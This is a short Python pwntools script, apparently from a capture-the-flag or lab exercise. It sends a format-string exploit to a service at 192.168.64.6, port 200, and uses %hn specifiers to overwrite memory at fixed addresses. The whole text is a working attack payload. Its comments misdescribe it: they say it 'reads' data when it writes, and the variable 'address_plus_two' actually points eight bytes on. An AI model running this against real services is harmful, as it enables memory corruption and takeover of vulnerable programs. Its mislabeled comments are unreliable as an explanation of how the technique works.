#!/usr/bin/env python3

from pwn import *

# Define target IP and port
target_host = '192.168.64.6'
target_port = 200

# Define the address you want to write
address_to_write = 0x0804c0a8
address_plus_two = 0x0804c0b0

# Construct the payload
payload = (
    p32(address_to_write) + p32(address_plus_two) +  # Address to read in little-endian format
    b"%52437x%13$hn" + b"%56798x%14$hn"  # Format specifiers to read the data as a string
)

# Create the exploit code
exploit_code = payload + b"\n"

# Connect to the target using netcat
io = remote(target_host, target_port)

# Send the exploit code
io.send(exploit_code)

# Receive and print the response
#response = io.recvall()
#print(response.decode())

# Close the connection
io.close()

